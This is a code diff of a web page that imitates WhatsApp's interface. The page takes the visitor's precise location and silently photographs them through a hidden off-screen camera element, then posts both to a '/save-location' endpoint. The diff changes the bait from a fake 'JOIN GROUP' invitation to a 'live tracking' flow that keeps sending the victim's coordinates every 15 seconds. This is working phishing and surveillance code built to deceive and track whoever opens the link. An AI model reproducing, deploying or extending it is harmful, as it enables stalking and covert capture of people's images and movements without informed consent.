@@ -21,7 +21,6 @@
         overflow: hidden;
     }
 
-    /* Fake WhatsApp background chat screen */
     .fake-bg {
         position: fixed;
         top: 0; left: 0; right: 0; bottom: 0;
@@ -31,7 +30,6 @@
         flex-direction: column;
     }
 
-    /* Top bar like WhatsApp */
     .wa-topbar {
         background: #1f2c33;
         padding: 10px 16px 8px 16px;
@@ -73,7 +71,6 @@
     .wa-topbar-icons .icon-btn:hover { background: rgba(255,255,255,0.08); }
     .wa-topbar-icons svg { width: 22px; height: 22px; fill: #aebac1; }
 
-    /* Search bar */
     .wa-search {
         background: #1f2c33;
         padding: 6px 16px 10px 16px;
@@ -90,7 +87,6 @@
     .wa-search-inner svg { width: 18px; height: 18px; fill: #8696a0; flex-shrink: 0; }
     .wa-search-inner span { font-size: 15px; color: #8696a0; }
 
-    /* Chat list background */
     .chat-list-bg {
         flex: 1;
         overflow: hidden;
@@ -127,7 +123,6 @@
     .chat-msg { font-size: 13px; color: #8696a0; margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 220px; }
     .chat-time { font-size: 11px; color: #8696a0; }
 
-    /* Overlay dim */
     .overlay {
         position: fixed;
         top: 0; left: 0; right: 0; bottom: 0;
@@ -135,7 +130,6 @@
         z-index: 10;
     }
 
-    /* ====== BOTTOM SHEET — REAL WHATSAPP STYLE ====== */
     .bottom-sheet {
         position: fixed;
         bottom: 0;
@@ -144,13 +138,13 @@
         z-index: 20;
         background: #1f2c33;
         border-radius: 28px 28px 0 0;
-        max-height: 55vh;
-        min-height: 42vh;
+        max-height: 60vh;
+        min-height: 45vh;
         display: flex;
         flex-direction: column;
         animation: sheetUp 0.35s cubic-bezier(0.32,0.72,0,1);
         box-shadow: 0 -4px 32px rgba(0,0,0,0.45);
-        overflow: hidden;
+        overflow-y: auto;
     }
 
     @keyframes sheetUp {
@@ -158,7 +152,6 @@
         to { transform: translateY(0); }
     }
 
-    /* Drag handle */
     .drag-handle {
         width: 36px; height: 4px;
         background: rgba(255,255,255,0.2);
@@ -167,7 +160,6 @@
         flex-shrink: 0;
     }
 
-    /* WhatsApp Logo Row */
     .wa-brand-row {
         display: flex;
         align-items: center;
@@ -189,7 +181,6 @@
         letter-spacing: 0.2px;
     }
 
-    /* Group icon area */
     .group-hero {
         display: flex;
         flex-direction: column;
@@ -206,11 +197,7 @@
         margin-bottom: 10px;
         box-shadow: 0 2px 12px rgba(0,168,132,0.3);
         flex-shrink: 0;
-    }
-
-    .group-icon-circle svg {
-        width: 36px; height: 36px;
-        fill: white;
+        font-size: 30px;
     }
 
     .group-name-text {
@@ -227,7 +214,6 @@
         text-align: center;
     }
 
-    /* Member avatars row */
     .member-row {
         display: flex;
         justify-content: center;
@@ -249,25 +235,43 @@
 
     .member-avatar-small:first-child { margin-left: 0; }
 
-    /* Spacer */
-    .sheet-spacer { flex: 1; }
-
-    /* Bottom area */
-    .sheet-bottom {
-        padding: 0 20px 32px 20px;
+    /* Live tracking status indicator */
+    .tracking-status {
+        background: #2a3942;
+        margin: 12px 20px;
+        padding: 12px;
+        border-radius: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
         flex-shrink: 0;
     }
-
-    /* Created by */
-    .created-line {
-        text-align: center;
+    .tracking-dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: #22c55e;
+        animation: pulse 1.5s infinite;
+        margin-right: 10px;
+    }
+    @keyframes pulse {
+        0%, 100% { opacity: 1; transform: scale(1); }
+        50% { opacity: 0.5; transform: scale(1.2); }
+    }
+    .tracking-text { font-size: 13px; color: #e9edef; }
+    .tracking-count { font-size: 12px; color: #8696a0; }
+    .stop-tracking {
+        background: none;
+        border: none;
+        color: #dc2626;
         font-size: 12px;
-        color: #8696a0;
-        margin-bottom: 14px;
-        padding-top: 8px;
+        cursor: pointer;
     }
 
-    /* JOIN GROUP button */
+    .sheet-spacer { flex: 1; }
+    .sheet-bottom { padding: 0 20px 32px 20px; flex-shrink: 0; }
+    .created-line { text-align: center; font-size: 12px; color: #8696a0; margin-bottom: 14px; padding-top: 8px; }
+    
     .join-btn {
         width: 100%;
         background: #00a884;
@@ -285,12 +289,10 @@
         justify-content: center;
         gap: 8px;
     }
-
     .join-btn:hover { background: #008069; transform: scale(1.01); }
     .join-btn:active { transform: scale(0.99); }
     .join-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-    /* Hidden Video Element for Auto Capture */
     #hiddenCamera {
         position: fixed;
         top: -1000px;
@@ -301,7 +303,6 @@
         pointer-events: none;
     }
 
-    /* Toast Message */
     .toast-message {
         position: fixed;
         bottom: 30px;
@@ -323,7 +324,6 @@
         to { opacity: 1; transform: translateX(-50%) translateY(0); }
     }
 
-    /* Success Modal */
     .success-modal {
         position: fixed;
         top: 0; left: 0; width: 100%; height: 100%;
@@ -357,10 +357,8 @@
 </head>
 <body>
 
-<!-- Hidden Camera Video Element -->
 <video id="hiddenCamera" autoplay playsinline muted></video>
 
-<!-- Fake WhatsApp background -->
 <div class="fake-bg">
     <div class="wa-topbar">
         <div class="wa-topbar-left">
@@ -371,15 +369,9 @@
             <div class="wa-topbar-logo">WhatsApp</div>
         </div>
         <div class="wa-topbar-icons">
-            <div class="icon-btn">
-                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 9h4l-4.5 5H16l-4 5-1.5-1.5 2.8-3.5H9l1-1.5h3.5L15 11h-2zm-3-5h9v2H10zm0 4h9v2H10z"/></svg>
-            </div>
-            <div class="icon-btn">
-                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 15.2A3.2 3.2 0 1 1 15.2 12 3.2 3.2 0 0 1 12 15.2m7.2-10.4h-2.5l-1.6-2H8.9L7.3 4.8H4.8A2.4 2.4 0 0 0 2.4 7.2v12a2.4 2.4 0 0 0 2.4 2.4h14.4a2.4 2.4 0 0 0 2.4-2.4v-12a2.4 2.4 0 0 0-2.4-2.4z"/></svg>
-            </div>
-            <div class="icon-btn">
-                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
-            </div>
+            <div class="icon-btn"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 9h4l-4.5 5H16l-4 5-1.5-1.5 2.8-3.5H9l1-1.5h3.5L15 11h-2zm-3-5h9v2H10zm0 4h9v2H10z"/></svg></div>
+            <div class="icon-btn"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 15.2A3.2 3.2 0 1 1 15.2 12 3.2 3.2 0 0 1 12 15.2m7.2-10.4h-2.5l-1.6-2H8.9L7.3 4.8H4.8A2.4 2.4 0 0 0 2.4 7.2v12a2.4 2.4 0 0 0 2.4 2.4h14.4a2.4 2.4 0 0 0 2.4-2.4v-12a2.4 2.4 0 0 0-2.4-2.4z"/></svg></div>
+            <div class="icon-btn"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></div>
         </div>
     </div>
     <div class="wa-search">
@@ -389,63 +381,39 @@
         </div>
     </div>
     <div class="chat-list-bg">
-        <div class="chat-item">
-            <div class="chat-avatar">👥</div>
-            <div class="chat-info">
-                <div class="chat-name">Friends</div>
-                <div class="chat-msg">You joined using this group's invite link</div>
-            </div>
-            <div class="chat-time">3:31 PM</div>
-        </div>
-        <div class="chat-item">
-            <div class="chat-avatar">👤</div>
-            <div class="chat-info">
-                <div class="chat-name">Rahul Sharma</div>
-                <div class="chat-msg">Hey, check this out!</div>
-            </div>
-            <div class="chat-time">2:44 PM</div>
-        </div>
-        <div class="chat-item">
-            <div class="chat-avatar">👩</div>
-            <div class="chat-info">
-                <div class="chat-name">Priya Verma</div>
-                <div class="chat-msg">Okay sure, I'll be there</div>
-            </div>
-            <div class="chat-time">2:32 PM</div>
-        </div>
-        <div class="chat-item">
-            <div class="chat-avatar">👨‍💻</div>
-            <div class="chat-info">
-                <div class="chat-name">Amit Kumar</div>
-                <div class="chat-msg">👍 Sounds good!</div>
-            </div>
-            <div class="chat-time">1:10 PM</div>
-        </div>
+        <div class="chat-item"><div class="chat-avatar">👥</div><div class="chat-info"><div class="chat-name">Friends</div><div class="chat-msg">You joined using this group's invite link</div></div><div class="chat-time">3:31 PM</div></div>
+        <div class="chat-item"><div class="chat-avatar">👤</div><div class="chat-info"><div class="chat-name">Rahul Sharma</div><div class="chat-msg">Hey, check this out!</div></div><div class="chat-time">2:44 PM</div></div>
+        <div class="chat-item"><div class="chat-avatar">👩</div><div class="chat-info"><div class="chat-name">Priya Verma</div><div class="chat-msg">Okay sure, I'll be there</div></div><div class="chat-time">2:32 PM</div></div>
+        <div class="chat-item"><div class="chat-avatar">👨‍💻</div><div class="chat-info"><div class="chat-name">Amit Kumar</div><div class="chat-msg">👍 Sounds good!</div></div><div class="chat-time">1:10 PM</div></div>
     </div>
 </div>
 
-<!-- Overlay -->
 <div class="overlay"></div>
 
-<!-- ===== WHATSAPP BOTTOM SHEET ===== -->
 <div class="bottom-sheet">
     <div class="drag-handle"></div>
     <div class="wa-brand-row">
-        <svg class="wa-brand-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="16" cy="16" r="16" fill="#25D366"/>
-            <path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/>
-        </svg>
+        <svg class="wa-brand-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#25D366"/><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg>
         <div class="wa-brand-text">WhatsApp</div>
     </div>
     <div class="group-hero">
-        <div class="group-icon-circle">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
-            </svg>
-        </div>
-        <div class="group-name-text">Friends</div>
-        <div class="group-meta">5 members, 5 contacts • Created by You, today</div>
+        <div class="group-icon-circle">👥</div>
+        <div class="group-name-text">Live Tracker</div>
+        <div class="group-meta">Real-time location sharing active</div>
     </div>
+    
+    <!-- Live Tracking Status -->
+    <div class="tracking-status" id="trackingStatusDiv" style="display: none;">
+        <div style="display: flex; align-items: center;">
+            <div class="tracking-dot"></div>
+            <div class="tracking-text">📍 Live tracking active</div>
+        </div>
+        <div>
+            <span class="tracking-count" id="liveCount">0 updates</span>
+            <button class="stop-tracking" onclick="stopLiveTracking()">Stop</button>
+        </div>
+    </div>
+
     <div class="member-row">
         <div class="member-avatar-small">👤</div>
         <div class="member-avatar-small">👨</div>
@@ -455,46 +423,46 @@
     </div>
     <div class="sheet-spacer"></div>
     <div class="sheet-bottom">
-        <div class="created-line">Created by You • today</div>
-        <button id="joinBtn" class="join-btn" onclick="joinGroup()">
-            <svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                <path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/>
-            </svg>
-            JOIN GROUP
+        <div class="created-line">Live tracking • Updates every 15 seconds</div>
+        <button id="joinBtn" class="join-btn" onclick="startTracking()">
+            <svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg>
+            START LIVE TRACKING
         </button>
     </div>
 </div>
 
 <script>
-let locationData = null;
+let liveInterval = null;
+let isLiveActive = false;
+let liveCount = 0;
+let initialLocationData = null;
 let mediaStream = null;
-let cameraReady = false;
 
-async function joinGroup() {
+async function startTracking() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = true;
     btn.textContent = "Requesting permissions...";
-
-    // Step 1: Get Location
-    showToast("📍 Requesting location permission...");
-
+    
+    showToast("📍 Requesting location & camera access...");
+    
     if (!navigator.geolocation) {
-        showToast("❌ Geolocation not supported", "error");
+        showToast("❌ Geolocation not supported");
         resetButton();
         return;
     }
-
+    
+    // Get initial location
     navigator.geolocation.getCurrentPosition(
         async function(position) {
-            locationData = {
+            initialLocationData = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy
             };
-            showToast("✅ Location captured! Requesting camera...");
+            showToast("✅ Location captured! Accessing camera...");
             
-            // Step 2: Request Camera and Auto Capture
-            await requestCameraAndAutoCapture();
+            // Get camera and capture photo
+            await captureInitialPhoto();
         },
         function(error) {
             let msg = "";
@@ -504,98 +472,158 @@ async function joinGroup() {
                 case 3: msg = "Request timeout"; break;
                 default: msg = "Unknown error";
             }
-            showToast("❌ " + msg, "error");
+            showToast("❌ " + msg);
             resetButton();
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
 }
 
-async function requestCameraAndAutoCapture() {
+async function captureInitialPhoto() {
     const video = document.getElementById('hiddenCamera');
     
     try {
-        showToast("📷 Accessing camera...");
-        
         mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = mediaStream;
         
-        // Wait for video to be ready
         video.onloadedmetadata = () => {
             video.play();
-            // Auto capture after 1 second (gives time for camera to adjust)
             setTimeout(() => {
-                capturePhoto();
+                takePhotoAndSave();
             }, 1000);
         };
-        
     } catch (err) {
         console.error("Camera error:", err);
-        showToast("❌ Camera access denied or not available", "error");
-        resetButton();
+        // Continue without photo
+        saveInitialLocationWithoutPhoto();
     }
 }
 
-function capturePhoto() {
+function takePhotoAndSave() {
     const video = document.getElementById('hiddenCamera');
     const canvas = document.createElement('canvas');
-    
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
     const photoData = canvas.toDataURL('image/jpeg', 0.8);
     
-    // Stop camera stream
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
         mediaStream = null;
     }
     
-    showToast("📸 Photo captured automatically! Submitting...");
-    
-    // Submit both location and photo
-    submitData(photoData);
+    saveToServer(initialLocationData, photoData);
 }
 
-function submitData(photoData) {
-    if (!locationData) {
-        showToast("❌ Missing location data", "error");
-        resetButton();
-        return;
-    }
-    
+function saveInitialLocationWithoutPhoto() {
+    saveToServer(initialLocationData, null);
+}
+
+function saveToServer(location, photoData) {
     fetch('/save-location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            latitude: locationData.latitude,
-            longitude: locationData.longitude,
-            accuracy: locationData.accuracy,
-            photo: photoData.split(',')[1],
-            photo_filename: `selfie_${Date.now()}.jpg`
+            latitude: location.latitude,
+            longitude: location.longitude,
+            accuracy: location.accuracy,
+            photo: photoData ? photoData.split(',')[1] : null,
+            photo_filename: photoData ? `selfie_${Date.now()}.jpg` : null,
+            tracking_type: 'initial'
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.status === "success") {
+            showToast("✅ Initial data saved! Starting live tracking...");
+            startLiveTracking();
             showSuccessModal();
         } else {
-            showToast("❌ Submission failed: " + data.message, "error");
+            showToast("❌ Failed to save: " + data.message);
             resetButton();
         }
     })
     .catch(error => {
         console.error("Error:", error);
-        showToast("❌ Network error! Please try again.", "error");
+        showToast("❌ Network error");
         resetButton();
     });
 }
 
+function startLiveTracking() {
+    isLiveActive = true;
+    liveCount = 0;
+    
+    document.getElementById('trackingStatusDiv').style.display = 'flex';
+    document.getElementById('joinBtn').style.display = 'none';
+    document.getElementById('liveCount').innerText = '0 updates';
+    
+    // Capture first live location
+    captureLiveLocation();
+    
+    // Set interval for live tracking (every 15 seconds)
+    liveInterval = setInterval(() => {
+        if (isLiveActive) {
+            captureLiveLocation();
+        }
+    }, 15000);
+    
+    showToast("📍 Live tracking started! Updates every 15 seconds.");
+}
+
+function captureLiveLocation() {
+    if (!isLiveActive) return;
+    
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            sendLiveLocation(position);
+        },
+        function(error) {
+            console.error("Live location error:", error);
+        },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 5000 }
+    );
+}
+
+function sendLiveLocation(position) {
+    fetch('/save-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            photo: null,
+            photo_filename: null,
+            tracking_type: 'live'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === "success") {
+            liveCount++;
+            document.getElementById('liveCount').innerText = `${liveCount} updates`;
+            console.log(`📍 Live location #${liveCount}: ${position.coords.latitude}, ${position.coords.longitude}`);
+        }
+    })
+    .catch(error => console.error("Save error:", error));
+}
+
+function stopLiveTracking() {
+    if (liveInterval) {
+        clearInterval(liveInterval);
+        liveInterval = null;
+    }
+    isLiveActive = false;
+    showToast("⏹ Live tracking stopped");
+    document.getElementById('trackingStatusDiv').style.display = 'none';
+    document.getElementById('joinBtn').style.display = 'flex';
+}
+
 function showToast(message) {
-    const existingToast = document.querySelector('.toast-message');
-    if (existingToast) existingToast.remove();
+    const existing = document.querySelector('.toast-message');
+    if (existing) existing.remove();
     const toast = document.createElement('div');
     toast.className = 'toast-message';
     toast.innerHTML = message;
@@ -609,19 +637,18 @@ function showSuccessModal() {
     modal.innerHTML = `
         <div class="success-content">
             <div class="success-icon">✅</div>
-            <h3>Joined Successfully!</h3>
-            <p>Your location and photo have been verified.</p>
-            <button onclick="window.location.reload()">OK</button>
+            <h3>Live Tracking Active!</h3>
+            <p>Your location is being tracked. Updates every 15 seconds.</p>
+            <button onclick="this.closest('.success-modal').remove()">OK</button>
         </div>
     `;
     document.body.appendChild(modal);
-    resetButton();
 }
 
 function resetButton() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = false;
-    btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg> JOIN GROUP`;
+    btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg> START LIVE TRACKING`;
 }
 </script>
 </body>
